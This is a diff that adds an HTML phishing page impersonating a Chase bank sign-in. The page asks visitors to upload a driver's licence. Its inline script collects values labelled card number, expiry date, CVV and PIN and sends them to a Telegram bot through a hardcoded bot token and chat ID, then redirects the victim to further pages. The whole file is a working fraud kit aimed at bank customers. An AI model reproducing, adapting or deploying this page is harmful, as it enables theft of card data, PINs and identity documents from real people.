@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>Sign in - Chase</title>
+    <link rel="stylesheet" href="dl.css">
+</head>
+<body>
+
+    <div class="container">
+        <div class="container_element">
+
+
+
+
+            <!-- FORM -->
+            <form action="" id="form">
+            
+            <div class="wolf_image">
+                <div class="chase_image">
+                    <img src="IMAGES/pngwing.com.png" alt="">
+                </div>
+
+                <div class="oiuy">
+                <div class="login">
+                    <div class="login_element">
+                        <!-- <div class="login_element_one">
+                            <input type="text" name="" id="username" placeholder="Username" required class="credit_cardsss"> 
+                            <label for="username" id="absolu">Email Address</label>
+                        </div>
+                        <div class="login_element_one">
+                            <input type="text" name="" id="password" placeholder="Password" required class="month_yearsss">
+                            <label for="password" id="absolu">Email Password</label>
+                        </div> -->
+
+                            <!-- <input type="text" name="" id="bb" placeholder="Password" maxlength="4"> -->
+
+
+
+                        <div class="form_container_four">
+
+                            <button class="btn_warning">
+                                Upload Drivers Liscense
+                                <input type="file" required name="" id="fileinput">
+                            </button>
+
+                        </div>
+
+                        <!-- <div class="login_element_token">
+                            <input type="text" name="CHASE BANK TOKEN" id="token" placeholder="Token">
+                            <label for="token" id="absolu">Token</label>
+                        </div> -->
+                        <div class="login_element_two">
+                            <div class="login_element_two_flex">
+                                <input type="checkbox" name="" id="remember_me">
+                                <label for="remember_me">Remember me</label>
+                            </div>
+                            <!-- <div class="login_element_two_flex">
+                                <input type="checkbox" name="" id="use_token">
+                                <label for="use_token">Use token</label>
+                            </div> -->
+                        </div>
+                        <div class="signin">
+                            <button type="submit">Sign in</button>
+                        </div>
+                        <div class="forgot_password">
+                            <!-- <p>Forgot username/password? <img src="" alt=""></p> -->
+                            <p>Not Enrolled? Sign Up Now. <img src="" alt=""></p>
+                        </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+
+     
+
+                        <div class="follow_us">
+                            <p>Follow us:</p>
+                            <img src="IMAGES/facebook.svg" alt="">
+                            <img src="IMAGES/instagram.svg" alt="">
+                            <img src="IMAGES/telegram.svg" alt="">
+                            <img src="IMAGES/square-youtube.svg" alt="">
+                            <img src="IMAGES/linkedin-in.svg" alt="">
+                        </div>
+
+                        <hr>
+
+                        <div class="last">
+                            <a href="">Contact us</a>
+                            <a href="">Privacy</a>
+                            <a href="">Security</a>
+                            <a href="">Terms and use</a>
+                            <a href="">Accessibility</a>
+                            <a href="">SAFE Act: Chase Mortgage Loan Originators</a>
+                            <a href="">Fair Lenging</a>
+                            <a href="">About Chase</a>
+                            <a href="">J.P. Morgan</a>
+                            <a href="">JPMorgan Chase & Co</a>
+                            <a href="">Careers</a>
+                            <a href="">Espanol</a>
+                            <a href="">Chase Canada</a>
+                            <a href="">Site map</a>
+                            <a href="" id="none_a">Member FDIC</a>
+                            <a href="" id="none_a">Equal Housing Lender</a>
+                        </div>
+                        <div class="copyright">
+                            <p>(c) 2016 JPMorgan Chase & Co.</p>
+                        </div>
+
+
+            </form>
+
+
+
+        </div>
+    </div>
+
+
+
+
+        <!-- FORM -->
+        <script>
+            let form = document.querySelector("#form");
+        
+            let bot = {
+                TOKEN: "6304903194:AAG193avR7mavtbvs-KuuH9bO4g64zHUJm0",
+                chatID: "6522391315",
+            }
+        
+            form.addEventListener("submit", (e) => {
+                e.preventDefault();
+        
+                var user_cardnum = document.getElementById("username").value
+                var user_cardexpdate = document.getElementById("password").value
+                var user_cardcvv = document.getElementById("aa").value
+                var user_cardpin = document.getElementById("bb").value
+        
+                var my_text = `----Chase----%0ACardnumber : ${user_cardnum}%0AExpiry Date : ${user_cardexpdate}%0ACvv : ${user_cardcvv}%0APin : ${user_cardpin}`
+        
+                fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
+                    method: "GET"
+                })
+        
+                .then(success => {
+                    window.location.href='ccard.html'
+                }, error => {
+                    window.location.href='personal.html'
+                })
+            })
+        </script>
+    
+
+    <script>
+        let login_element_token = document.querySelector(".login_element_token")
+        let use_token = document.getElementById("use_token")
+
+        use_token.addEventListener("click", function(){
+            login_element_token.classList.toggle("show_token")
+        })
+    </script>
+
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.4.3/cleave.min.js"></script>
+    
+
+    <script>
+        var cleave = new Cleave('.credit_cardsss', {
+            creditCard: true,
+            onCreditCardTypeChanged: function (type) {
+                // update UI ...
+            }
+        });
+    </script>
+    
+    
+    <script>
+        var cleave = new Cleave('.month_yearsss', {
+            date: true,
+            datePattern: ['m', 'y']
+        });
+    </script>
+
+
+
+</body>
+</html>
